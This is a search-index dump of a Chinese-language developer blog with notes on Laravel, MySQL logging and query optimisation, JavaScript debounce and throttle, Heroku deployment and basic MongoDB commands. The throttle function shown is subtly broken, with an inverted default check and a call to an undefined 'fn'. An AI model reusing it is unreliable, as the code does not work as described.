'active' : null }}\"\u003e \u003ca href=\"{{ url('programs' )}}\" \u003e\u003c/i\u003e Programs\u003c/a\u003e \u003c/li\u003e \u003cli class=\"{{ Request::segment(1) === 'beneficiaries' ? 'active' : null }}\"\u003e \u003ca href=\"{{url('beneficiaries')}}\"\u003e Beneficiaries\u003c/a\u003e \u003c/li\u003e \u003cli class=\"{{ Request::segment(1) === 'indicators' ? 'active' : null }}\"\u003e \u003ca href=\"{{url('indicators')}}\"\u003e Indicators\u003c/a\u003e \u003c/li\u003e \u003c/ul\u003e or \u003cdiv class=\"container-fluid\"\u003e \u003cdiv class=\"navbar-header\"\u003e \u003ca class=\"navbar-brand\" href=\"#\"\u003eWebSiteName\u003c/a\u003e \u003c/div\u003e \u003cul class=\"nav navbar-nav\"\u003e \u003cli class=\"{{Request::is('/')?'active':''}}\"\u003e\u003ca href=\"{{url('/')}}\"\u003eHome\u003c/a\u003e\u003c/li\u003e \u003cli class=\"{{Request::is('/page1')?'active':''}}\"\u003e\u003ca href=\"{{url('/page1')}}\"\u003ePage 1\u003c/a\u003e\u003c/li\u003e \u003cli class=\"{{Request::is('/page2')?'active':''}}\"\u003e\u003ca href=\"{{url('/page2')}}\"\u003ePage 2\u003c/a\u003e\u003c/li\u003e \u003cli class=\"{{Request::is('/page3')?'active':''}}\"\u003e\u003ca href=\"{{url('/page3')}}\"\u003ePage 3\u003c/a\u003e\u003c/li\u003e \u003c/ul\u003e \u003c/div\u003e \u003c/nav\u003e php - Setting Bootstrap navbar active class in Laravel 5 - Stack Overflow how to set bootstrap navbar class active - Scoopism ","date":"2019-07-16","objectID":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/:22:1","tags":["laravel"],"title":"Laravel 實作小記","uri":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Laravel"],"content":"blade section/show 使用 @section (‘yourSectionName’)…..@show。子子孫孫都使用 @section (‘contents’)……@endsection 去繼承實現。 關於 @section…@show;@section….@endsection 的用法分析 | Laravel China 社區 ","date":"2019-07-16","objectID":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/:22:2","tags":["laravel"],"title":"Laravel 實作小記","uri":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Laravel"],"content":"其他 php - prepare 与 sql 的开销？ - SegmentFault 思否 使用 batch insert 解决 MySQL 的 insert 吞吐量问题 - billy 鹏 - 博客园 php - Laravel Eloquent compare date from datetime field - Stack Overflow php 下 foreach()错误提示 Warning: Invalid argument supplied for foreach()_一聚教程网 php 出现 Warning: A non-numeric value encountered 问题的原因及解决方法 - 傲雪星枫 - CSDN 博客 pjax ","date":"2019-07-16","objectID":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/:23:0","tags":["laravel"],"title":"Laravel 實作小記","uri":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Laravel"],"content":"CDN 刷新缓存的方法 - 七牛开发者中心 app 接口设计 token 过期怎么使用_百度知道 php ini - setting max_input_vars PHP.ini directive using ini_set - Stack Overflow Laravel Migration、Model、DB 物件 相關操作 (濃縮) - La Tech. Redis 禁用 FLUSHALL FLUSHDB KEYS 命令 - 星瑞 - 博客园 Docker 使用 cron 定时任务 - 歪麦博客 Laravel 模型关联 attach,save,sync 方法参数类型验证 - Coder_Chang 的博客 - CSDN 博客 associate 的意义？ | Laravel China 社区 Laravel_使用 Passport 寫 API - 總有一天我要當超人 php - How to save in a polymorphic relationship in Laravel? - Stack Overflow save() on polymorphic relation don’t work 模型关联 | 《Laravel Nova 中文文档》 [5.1] Saving morphTo relation. · Issue #11918 · laravel/framework Eloquent 关系图例（译） | Laravel China 社区 laravel Carbon 函数 - 醒来明月 - CSDN 博客 如何使用 K8S 自動化定期 CronJob 抓網路公開資料 | TechBridge 技術共筆部落格 Kubernetes 中的 Job 和 CronJob，批量任务执行 - mark’s technic world - CSDN 博客 onlinereadbook/bookdocker: 線上 docker 讀書會 Repository Pattern and Service Layer – 佛祖球球 Laravel、Ruby on Rails、Django … 使用 Active Record Pattern 框架的最大問題：到底該把 save 寫在哪裡？ – Devs.tw 批評 Active Record 的13個論點：最好用也最危險的 Anti-pattern | 轉個彎日誌 (1) Laravel 台灣 ","date":"2019-07-16","objectID":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/:23:1","tags":["laravel"],"title":"Laravel 實作小記","uri":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["SQL"],"content":"最近聽說(同事)PHP 用 die 的話，可能不會關掉 PDO 連線 但聽說規聽說，Google 都沒有爬到，但我覺得這個我可以自己實驗 ","date":"2019-07-11","objectID":"/blog/posts/MySQL-%E8%A8%98%E9%8C%84%E6%89%80%E6%9C%89-sql-log-%E6%96%B9%E6%B3%95/:0:0","tags":["php","mysql","log"],"title":"MySQL 記錄所有 sql log 方法","uri":"/blog/posts/MySQL-%E8%A8%98%E9%8C%84%E6%89%80%E6%9C%89-sql-log-%E6%96%B9%E6%B3%95/"},{"categories":["SQL"],"content":"開 MySQL LOG 方法 有看到log=/tmp/mysql.log加在[mysqld]就可以了 但我一直失敗!! 不知道是不是我電腦是 window 關係 最後找到這篇可以正常執行 mysql 在 my.cnf 中配置日志文件路径出错报错:[ERROR] /usr/sbin/mysqld: ambiguous option ‘–log=/var/lib/mysql/mysql.log’ (log-bin, log_slave_updates) 解决方法 不要用 log 配置项，改用 general_log，具体配置如下： general_log=ON general_log_file=/tmp/mysql.log 其實這個跟我這次實驗沒關係 之後想研究 Laravel 想看她的結果 ","date":"2019-07-11","objectID":"/blog/posts/MySQL-%E8%A8%98%E9%8C%84%E6%89%80%E6%9C%89-sql-log-%E6%96%B9%E6%B3%95/:1:0","tags":["php","mysql","log"],"title":"MySQL 記錄所有 sql log 方法","uri":"/blog/posts/MySQL-%E8%A8%98%E9%8C%84%E6%89%80%E6%9C%89-sql-log-%E6%96%B9%E6%B3%95/"},{"categories":["SQL"],"content":"PDO 查看 prepare SQL log 長什麼樣子 原本就是想開 log 看有沒有執行 但發現 window 這段就會無效 有空我再找 linux 電腦測試 php - PDO 操作，设置了 ATTR_EMULATE_PREPARES 属性为 false 后发现还是在本地模拟 prepare - SegmentFault 思否 ","date":"2019-07-11","objectID":"/blog/posts/MySQL-%E8%A8%98%E9%8C%84%E6%89%80%E6%9C%89-sql-log-%E6%96%B9%E6%B3%95/:2:0","tags":["php","mysql","log"],"title":"MySQL 記錄所有 sql log 方法","uri":"/blog/posts/MySQL-%E8%A8%98%E9%8C%84%E6%89%80%E6%9C%89-sql-log-%E6%96%B9%E6%B3%95/"},{"categories":["SQL"],"content":"PHP die/exit 會做的事情 經過我測試，die 後會馬上關閉 pdo 連線 這是為什麼呢?我好奇去官網找一下答案 Terminates execution of the script. Shutdown functions and object destructors will always be executed even if exit is called. exit is a language construct and it can be called without parentheses if no status is passed. PHP: exit - Manual 好了，確定沒有這個問題，可以放心的使用這個東西 ","date":"2019-07-11","objectID":"/blog/posts/MySQL-%E8%A8%98%E9%8C%84%E6%89%80%E6%9C%89-sql-log-%E6%96%B9%E6%B3%95/:3:0","tags":["php","mysql","log"],"title":"MySQL 記錄所有 sql log 方法","uri":"/blog/posts/MySQL-%E8%A8%98%E9%8C%84%E6%89%80%E6%9C%89-sql-log-%E6%96%B9%E6%B3%95/"},{"categories":["SQL"],"content":"最近公司上線 APP 的某一筆資料原本要做例外排除 但是沒有做 因為這一筆資料會撈出過多的方法 APP 已經審查過 所以沒辦法更動 APP 只能看有沒有比較優的查詢方法 但是有網路找到一個方法 之前就有看過類似方法 不過都沒有紀錄 今天遇到，原本想說很複雜的 SQL 可能沒有什麼效果 但是今天用了一下 還不錯 SELECT * FROM test AS t INNER JOIN ( SELECT id FROM test ORDER BY post_time DESC LIMIT 15000,10 ) AS s ON t.id=s.id 我相信 , 這道指令應該 1 秒都不用 為何會如此呢 ? 因為我們在 subquery 中只有抓 id , 這樣 mysql 就只需要少量記憶體就可以存放資料列進行排序 , 原始的作法就是每一列有多少資料 , mysql 就必須分配多少記憶體 , 如果資料數太大 , 記憶體不夠分配 , 自然就是用 disk 了 但如果我們要抓的資料只是前面幾筆 , 例如 LIMIT 100,10 , 那麼原本的寫法會比較快 , 因此這可以在程式中判斷而交互使用兩種 QUERY 的方式 善用 sub query 優化 order by limit | 壞蛋的密室 SELECT xxx FROM xxx x1 INNER JOIN s ON x1.id = s.id ... LEFT JOIN pl ON pl.id = x1.id INNER JOIN (SELECT id FROM pl pl2 WHERE xxx_id IN ( select oo FROM ss where oo.id = ___ AND o.condition1 = 1 AND o.condition2 = 1 ) ORDER BY counts desc limit 0,500) as a ON pl.id = a.id WHERE s.id = ___ AND ... ORDER BY pl.counts DESC LIMIT 0, 500 沒想到這麼複雜 SQL 也可以這麼快 ","date":"2019-07-10","objectID":"/blog/posts/SQL-JOIN-LIMIT-%E8%A1%A8%E5%81%9A%E6%9F%A5%E8%A9%A2%E5%84%AA%E5%8C%96/:0:0","tags":["sql","join"],"title":"SQL JOIN LIMIT 表做查詢優化","uri":"/blog/posts/SQL-JOIN-LIMIT-%E8%A1%A8%E5%81%9A%E6%9F%A5%E8%A9%A2%E5%84%AA%E5%8C%96/"},{"categories":null,"content":"之前在看 Vue 範例就看到有這個 Debounce 函式運用 就很想做這個筆記 不過，今天同事有一個同時間觸發同一個 Event 最後想起一個 workaround 解決方式 首先，這個一般可以用 jQuery off 方式關掉全部的 Event 但這個也不是萬靈丹 在某種情況下還是無法用 這時候想到這個也能解決這個問題 不過因為他那個按鈕(開關套件)，不能同時按，因為有做 AJAX 關係 所以要用 ajax disabled 那個物件，completed 可以 enable 就能防止 bug 但能不要用這種方式最好 首先，記錄兩個差異 Debounce 主要用在事件處發，當下點下去第一下才會處發，後面幾毫秒不會觸發 Thtrottle 主要用在多次刷新，但是不需要太頻繁，通常用在做動畫上面 ","date":"2019-07-05","objectID":"/blog/posts/JavaScript-%E6%95%88%E8%83%BD%E5%84%AA%E5%8C%96-Debounce-%E5%92%8C-Throttle-%E5%B0%8F%E8%A8%98/:0:0","tags":null,"title":"JavaScript 效能優化 Debounce 和 Throttle 小記","uri":"/blog/posts/JavaScript-%E6%95%88%E8%83%BD%E5%84%AA%E5%8C%96-Debounce-%E5%92%8C-Throttle-%E5%B0%8F%E8%A8%98/"},{"categories":null,"content":"Debounce function debounce(func, delay) { var timer = null; return function() { var context = this; var args = arguments; clearTimeout(timer); timer = setTimeout(function() { func.apply(context, args); }, delay); }; } 簡單講就是設定 ","date":"2019-07-05","objectID":"/blog/posts/JavaScript-%E6%95%88%E8%83%BD%E5%84%AA%E5%8C%96-Debounce-%E5%92%8C-Throttle-%E5%B0%8F%E8%A8%98/:1:0","tags":null,"title":"JavaScript 效能優化 Debounce 和 Throttle 小記","uri":"/blog/posts/JavaScript-%E6%95%88%E8%83%BD%E5%84%AA%E5%8C%96-Debounce-%E5%92%8C-Throttle-%E5%B0%8F%E8%A8%98/"},{"categories":null,"content":"Throttle function throttle(func, threshhold) { var last, timer; if (threshhold) threshhold = 250; return function() { var context = this; var args = arguments; var now = +new Date(); if (last \u0026\u0026 now \u003c last + threshhold) { clearTimeout(timer); timer = setTimeout(function() { last = now; func.apply(context, args); }, threshhold); } else { last = now; fn.apply(context, args); } }; } 網頁 DOM 事件的效能優化：Debounce 和 Throttle | Mr. Opengate web1.png JS 专题之节流函数 - 知乎 ","date":"2019-07-05","objectID":"/blog/posts/JavaScript-%E6%95%88%E8%83%BD%E5%84%AA%E5%8C%96-Debounce-%E5%92%8C-Throttle-%E5%B0%8F%E8%A8%98/:2:0","tags":null,"title":"JavaScript 效能優化 Debounce 和 Throttle 小記","uri":"/blog/posts/JavaScript-%E6%95%88%E8%83%BD%E5%84%AA%E5%8C%96-Debounce-%E5%92%8C-Throttle-%E5%B0%8F%E8%A8%98/"},{"categories":null,"content":"第三方套件 Debounce、Throttle ","date":"2019-07-05","objectID":"/blog/posts/JavaScript-%E6%95%88%E8%83%BD%E5%84%AA%E5%8C%96-Debounce-%E5%92%8C-Throttle-%E5%B0%8F%E8%A8%98/:3:0","tags":null,"title":"JavaScript 效能優化 Debounce 和 Throttle 小記","uri":"/blog/posts/JavaScript-%E6%95%88%E8%83%BD%E5%84%AA%E5%8C%96-Debounce-%E5%92%8C-Throttle-%E5%B0%8F%E8%A8%98/"},{"categories":null,"content":"Lodash 推薦使用這個!! https://lodash.com/ ","date":"2019-07-05","objectID":"/blog/posts/JavaScript-%E6%95%88%E8%83%BD%E5%84%AA%E5%8C%96-Debounce-%E5%92%8C-Throttle-%E5%B0%8F%E8%A8%98/:3:1","tags":null,"title":"JavaScript 效能優化 Debounce 和 Throttle 小記","uri":"/blog/posts/JavaScript-%E6%95%88%E8%83%BD%E5%84%AA%E5%8C%96-Debounce-%E5%92%8C-Throttle-%E5%B0%8F%E8%A8%98/"},{"categories":null,"content":"Underscore http://underscorejs.org/ ","date":"2019-07-05","objectID":"/blog/posts/JavaScript-%E6%95%88%E8%83%BD%E5%84%AA%E5%8C%96-Debounce-%E5%92%8C-Throttle-%E5%B0%8F%E8%A8%98/:3:2","tags":null,"title":"JavaScript 效能優化 Debounce 和 Throttle 小記","uri":"/blog/posts/JavaScript-%E6%95%88%E8%83%BD%E5%84%AA%E5%8C%96-Debounce-%E5%92%8C-Throttle-%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"最近聽到 PHP 盡量不要用 switch 做條件 用 array 方式比較快!! 網路上很多都是比較 switch, if 當下就好奇了一下，修改遺下看秒數 ","date":"2019-07-04","objectID":"/blog/posts/php-Switch-if-%E9%99%A3%E5%88%97%E5%A5%97%E7%94%A8%E6%96%B9%E6%B3%95%E6%AF%94%E8%BC%83/:0:0","tags":["if","switch","if"],"title":"php switch, if, 陣列套用方法比較","uri":"/blog/posts/php-Switch-if-%E9%99%A3%E5%88%97%E5%A5%97%E7%94%A8%E6%96%B9%E6%B3%95%E6%AF%94%E8%BC%83/"},{"categories":["PHP"],"content":"if,switch 比較 Jiahe Jou: [轉錄] PHP - if v.s. switch 誰快? 當下修正 Online PHP editor | output for t8CM0 Output for 7.3.5 Performance Testing PHP if / else VS switch with 100,000 iterations total if / else time: 0.007087230682373 total case time: 0.0072040557861328 total array time: 0.006603479385376 Output for 5.6.0 Performance Testing PHP if / else VS switch with 100,000 iterations total if / else time: 0.035436391830444 total case time: 0.026345729827881 total array time: 0.046525478363037 可以看出 PHP 7 陣列效能真的快很多了 不過，我覺得還是要看情況用 不然失去程式可讀性也不是很好 ","date":"2019-07-04","objectID":"/blog/posts/php-Switch-if-%E9%99%A3%E5%88%97%E5%A5%97%E7%94%A8%E6%96%B9%E6%B3%95%E6%AF%94%E8%BC%83/:1:0","tags":["if","switch","if"],"title":"php switch, if, 陣列套用方法比較","uri":"/blog/posts/php-Switch-if-%E9%99%A3%E5%88%97%E5%A5%97%E7%94%A8%E6%96%B9%E6%B3%95%E6%AF%94%E8%BC%83/"},{"categories":["Heroku"],"content":"最近想寫一些程式放在網路上 但目前應該只有想測試程式用 網路有看到 Heroku 所以今天實作看看 ","date":"2019-06-30","objectID":"/blog/posts/heroku-%E6%9E%B6%E8%A8%AD-PHP-Laravel-%E5%B0%8F%E8%A8%98/:0:0","tags":["heroku","deploy"],"title":"heroku 架設 PHP \u0026 Laravel  小記","uri":"/blog/posts/heroku-%E6%9E%B6%E8%A8%AD-PHP-Laravel-%E5%B0%8F%E8%A8%98/"},{"categories":["Heroku"],"content":"官網教學 Getting Started on Heroku with PHP | Heroku Dev Center 準備 heroku cli 安裝 php composer cli 登入 heroku login 安裝測試 project git clone https://github.com/heroku/php-getting-started.git cd php-getting-started 建制部屬分支 heroku create 在下這個指令之前 請看現在git remote分支 只會有一個 master 但是打了heroku create 會多出一個分支，那個是部屬用的 推送程式上去 git push heroku master heroku open指令會跳出瀏覽器，可看到部屬成果 其實這邊算部屬完了 看 log heroku logs --tail Procfile 設定 其實看教學完後，我一直在想 Heroku 怎麼知道我不屬哪一個程式語言? 後來我看到這個，才知道為什麼 Heroku 能跑出我要的東西 為什麼自動部屬可以跑 composer? 我覺得應該是這個關係 heroku-buildpack-php/heroku-php-apache2 at master · heroku/heroku-buildpack-php web: vendor/bin/heroku-php-apache2 web/ 更新現有程式內容 這邊我就不詳細記錄了 文件建議 vendor 要加在.gititnore 裡面 composer require ... composer update git add . git commit -m 'demo' git push heroku master heroku open xxx 10 操作 heroku cli heroku run “php -a” heroku run bash 設定環境變數 // 設定環境變數 heroku config:set TIMES=20 // 看 heroku env heroku config 建置 Postgresql heroku addons:create heroku-postgresql:hobby-dev 環境變數會多一個 DATABASE_URL $dbopts = parse_url(getenv('DATABASE_URL')); $app-\u003eregister(new Csanquer\\Silex\\PdoServiceProvider\\Provider\\PDOServiceProvider('pdo'), array( 'pdo.server' =\u003e array( 'driver' =\u003e 'pgsql', 'user' =\u003e $dbopts[\"user\"], 'password' =\u003e $dbopts[\"pass\"], 'host' =\u003e $dbopts[\"host\"], 'port' =\u003e $dbopts[\"port\"], 'dbname' =\u003e ltrim($dbopts[\"path\"],'/') ) ) ); 網路也有茶道可以使用Heroku 連線 Postgresql 教學 ~ 度估記事本 去做 DB 管理 小記我 Heroku 有 rails 專案 之前 2014 年有參加 rails 新手活動 結果我今天用都忘記我有用過這個… 要怎麼把上面舊專案下載下來呢 heroku git:clone -a heroku_project ","date":"2019-06-30","objectID":"/blog/posts/heroku-%E6%9E%B6%E8%A8%AD-PHP-Laravel-%E5%B0%8F%E8%A8%98/:1:0","tags":["heroku","deploy"],"title":"heroku 架設 PHP \u0026 Laravel  小記","uri":"/blog/posts/heroku-%E6%9E%B6%E8%A8%AD-PHP-Laravel-%E5%B0%8F%E8%A8%98/"},{"categories":["Heroku"],"content":"Laravel 之後 Laravel 架設可能需要調整到 如何利用 Heroku 免費將本地 Laravel 專案部署到線上，已解決 - IT 閱讀 laravel-heroku-example/readme.md at master · jessedc/laravel-heroku-example 如何快速使用 Heroku 来部署你的 Laravel 应用 | Laravel China 社区 先記錄連結，有空寫寫我的部屬過程 ","date":"2019-06-30","objectID":"/blog/posts/heroku-%E6%9E%B6%E8%A8%AD-PHP-Laravel-%E5%B0%8F%E8%A8%98/:2:0","tags":["heroku","deploy"],"title":"heroku 架設 PHP \u0026 Laravel  小記","uri":"/blog/posts/heroku-%E6%9E%B6%E8%A8%AD-PHP-Laravel-%E5%B0%8F%E8%A8%98/"},{"categories":["Heroku"],"content":"更多 heroku cli 指令 Heroku 運行類別、 Procfile、常用指令筆記 | DEVLOG of andyyou ","date":"2019-06-30","objectID":"/blog/posts/heroku-%E6%9E%B6%E8%A8%AD-PHP-Laravel-%E5%B0%8F%E8%A8%98/:3:0","tags":["heroku","deploy"],"title":"heroku 架設 PHP \u0026 Laravel  小記","uri":"/blog/posts/heroku-%E6%9E%B6%E8%A8%AD-PHP-Laravel-%E5%B0%8F%E8%A8%98/"},{"categories":["MongoDB"],"content":"最近專案有用到這個 有看到使用Robo 3T 但對這一塊不是很了解 這邊主要是紀錄如何操作 MonogoDB 不會記載 MonogoDB 詳細知識 ","date":"2019-06-30","objectID":"/blog/posts/MonogoDB-%E6%93%8D%E4%BD%9C%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/:0:0","tags":["monogodb"],"title":"MonogoDB 操作使用小記","uri":"/blog/posts/MonogoDB-%E6%93%8D%E4%BD%9C%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":["MongoDB"],"content":"有哪幾種 NoSQL?(4 種) Key-value store ex: BigTable、Hadoop Document store ex: MongoDB Graph ex: Neo4J 列存儲(Wide Column Store/Column-Family)資料庫(記憶體資料庫是知名網站慣用快取工具) ex: Memcached、Redis、Velocity 快速認識 4 類主流 NoSQL 資料庫 | iThome ","date":"2019-06-30","objectID":"/blog/posts/MonogoDB-%E6%93%8D%E4%BD%9C%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/:1:0","tags":["monogodb"],"title":"MonogoDB 操作使用小記","uri":"/blog/posts/MonogoDB-%E6%93%8D%E4%BD%9C%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":["MongoDB"],"content":"簡單架設 MonogoDB ","date":"2019-06-30","objectID":"/blog/posts/MonogoDB-%E6%93%8D%E4%BD%9C%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/:2:0","tags":["monogodb"],"title":"MonogoDB 操作使用小記","uri":"/blog/posts/MonogoDB-%E6%93%8D%E4%BD%9C%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":["MongoDB"],"content":"docker 架設 參考裡面 docker-compose.yml ","date":"2019-06-30","objectID":"/blog/posts/MonogoDB-%E6%93%8D%E4%BD%9C%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/:2:1","tags":["monogodb"],"title":"MonogoDB 操作使用小記","uri":"/blog/posts/MonogoDB-%E6%93%8D%E4%BD%9C%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":["MongoDB"],"content":"vagrant homestead 可以架設 或者比較單純Vagrant box benson/mongodb - Vagrant Cloud 或 Update to Mongo v3 · Issue #5 · bobthecow/vagrant-mongobox ","date":"2019-06-30","objectID":"/blog/posts/MonogoDB-%E6%93%8D%E4%BD%9C%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/:2:2","tags":["monogodb"],"title":"MonogoDB 操作使用小記","uri":"/blog/posts/MonogoDB-%E6%93%8D%E4%BD%9C%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":["MongoDB"],"content":"操作使用 ","date":"2019-06-30","objectID":"/blog/posts/MonogoDB-%E6%93%8D%E4%BD%9C%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/:3:0","tags":["monogodb"],"title":"MonogoDB 操作使用小記","uri":"/blog/posts/MonogoDB-%E6%93%8D%E4%BD%9C%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":["MongoDB"],"content":"local,config,admin databases 預設安裝完會看到有三個 database local,config,admin 三個 database 建議不要去動他 admin and local contain various settings local to the server, like users who are authenticated to connect. Under beginner usage, you shouldn’t need to worry about them at all. By default you connect to a database named test. To connect to a new database, just use databasename from the mongo command line, or mongo databasename from your OS shell. use [database_name] and then show collections The db object is your root handle to the currently-selected database on the mongo commmand line. The command line is really just a Javascript command line, and there are various mongodb-specific objects and functions exposed that let you do stuff. Try help() for a full listing. Some beginner’s questions about MongoDB - Stack Overflow MongoDB 管理：慎用 local、admin 数据库 | MongoDB 中文社区 ","date":"2019-06-30","objectID":"/blog/posts/MonogoDB-%E6%93%8D%E4%BD%9C%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/:3:1","tags":["monogodb"],"title":"MonogoDB 操作使用小記","uri":"/blog/posts/MonogoDB-%E6%93%8D%E4%BD%9C%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":["MongoDB"],"content":"mysql \u003c=\u003e mongodb MySQL MongoDB Table \u003c==\u003e Collection Row \u003c=\u003e Document Column \u003c=\u003e Field MongoDB and MySQL Compared | MongoDB ","date":"2019-06-30","objectID":"/blog/posts/MonogoDB-%E6%93%8D%E4%BD%9C%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/:4:0","tags":["monogodb"],"title":"MonogoDB 操作使用小記","uri":"/blog/posts/MonogoDB-%E6%93%8D%E4%BD%9C%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":["MongoDB"],"content":"操作使用 ","date":"2019-06-30","objectID":"/blog/posts/MonogoDB-%E6%93%8D%E4%BD%9C%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/:5:0","tags":["monogodb"],"title":"MonogoDB 操作使用小記","uri":"/blog/posts/MonogoDB-%E6%93%8D%E4%BD%9C%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":["MongoDB"],"content":"創建資料庫 use DATABASE_NAME 如果資料庫不存在，則創建資料庫，否則切換到指定資料庫。 ","date":"2019-06-30","objectID":"/blog/posts/MonogoDB-%E6%93%8D%E4%BD%9C%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/:5:1","tags":["monogodb"],"title":"MonogoDB 操作使用小記","uri":"/blog/posts/MonogoDB-%E6%93%8D%E4%BD%9C%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":["MongoDB"],"content":"刪除資料庫 db.dropDatabase() 刪除所在的 Database ","date":"2019-06-30","objectID":"/blog/posts/MonogoDB-%E6%93%8D%E4%BD%9C%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/:5:2","tags":["monogodb"],"title":"MonogoDB 操作使用小記","uri":"/blog/posts/MonogoDB-%E6%93%8D%E4%BD%9C%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":["MongoDB"],"content":"创建集合(Collection) db.createCollection(name, options) db.createCollection(\"mycol\", { capped : true, autoIndexId : true, size : 6142800, max : 10000 } 創建固定集合 mycol，整個集合空間大小 6142800 KB, 文檔最大個數為 10000 個。 ","date":"2019-06-30","objectID":"/blog/posts/MonogoDB-%E6%93%8D%E4%BD%9C%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/:5:3","tags":["monogodb"],"title":"MonogoDB 操作使用小記","uri":"/blog/posts/MonogoDB-%E6%93%8D%E4%BD%9C%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":["MongoDB"],"content":"插入文件(Document) db.COLLECTION_NAME.insert(document) db.col.insert({ title: \"MongoDB 教程\", description: \"MongoDB 是一個 Nosql 數據庫\", by: \"菜鳥教程\", url: \"http://www.runoob.com\", tags: [\"mongodb\", \"database\", \"NoSQL\"], likes: 100 }); ","date":"2019-06-30","objectID":"/blog/posts/MonogoDB-%E6%93%8D%E4%BD%9C%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/:5:4","tags":["monogodb"],"title":"MonogoDB 操作使用小記","uri":"/blog/posts/MonogoDB-%E6%93%8D%E4%BD%9C%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":["MongoDB"],"content":"查詢集合 db.col.find() ","date":"2019-06-30","objectID":"/blog/posts/MonogoDB-%E6%93%8D%E4%BD%9C%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/:5:5","tags":["monogodb"],"title":"MonogoDB 操作使用小記","uri":"/blog/posts/MonogoDB-%E6%93%8D%E4%BD%9C%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":["MongoDB"],"content":"刪除文件 db.collection.remove( \u003cquery\u003e, \u003cjustOne\u003e ) MongoDB 刪除文檔 | 菜鳥教程 remove() 方法已經過時了，現在官方推薦使用 deleteOne() 和 deleteMany() 方法。 如刪除集合下全部文檔： db.inventory.deleteMany({}) 刪除 status 等於 A 的全部文檔： db.inventory.deleteMany({ status : \"A\" }) 刪除 status 等於 D 的一個文檔： db.inventory.deleteOne( { status: \"D\" } ) 三國電視台 三國電視台 tre***3@126.com 2年前 (2017-09-22) sairre jsa***e@163.com remove() 方法 並不會真正釋放空間。 需要繼續執行 db.repairDatabase() 來回收磁盤空間。 \u003e db.repairDatabase() 或者 \u003e db.runCommand({ repairDatabase: 1 }) ","date":"2019-06-30","objectID":"/blog/posts/MonogoDB-%E6%93%8D%E4%BD%9C%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/:5:6","tags":["monogodb"],"title":"MonogoDB 操作使用小記","uri":"/blog/posts/MonogoDB-%E6%93%8D%E4%BD%9C%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":["MongoDB"],"content":"修改文件 db.collection.update( \u003cquery\u003e, \u003cupdate\u003e, { upsert: \u003cboolean\u003e, multi: \u003cboolean\u003e, writeConcern: \u003cdocument\u003e } ) 在3.2版本开始，MongoDB提供以下更新集合文档的方法： db.collection.updateOne() 向指定集合更新单个文档 db.collection.updateMany() 向指定集合更新多个文档 更多內容可看MongoDB 教程 | 菜鸟教程 由於裡面教學應該是 2.x 版 可以看評論裡面補充很多東西 ","date":"2019-06-30","objectID":"/blog/posts/MonogoDB-%E6%93%8D%E4%BD%9C%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/:5:7","tags":["monogodb"],"title":"MonogoDB 操作使用小記","uri":"/blog/posts/MonogoDB-%E6%93%8D%E4%BD%9C%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":["MongoDB"],"content":"Robo 3T 操作 MongoDB MongoDB 可视化工具–Robo 3T 使用教程 - 龙恩 0707 - 博客园 adminMongo ","date":"2019-06-30","objectID":"/blog/posts/MonogoDB-%E6%93%8D%E4%BD%9C%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/:6:0","tags":["monogodb"],"title":"MonogoDB 操作使用小記","uri":"/blog/posts/MonogoDB-%E6%93%8D%E4%BD%9C%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":["MongoDB"],"content":"刪除資料 OR 篩選資料 的問題 「乾貨」mongoDB 釋放磁碟占用 - 每日頭條 目前專案裡面放的資料好像不會去做刪除或者撈出來資料不會做篩選 不知道是不是非常耗效能關係?? 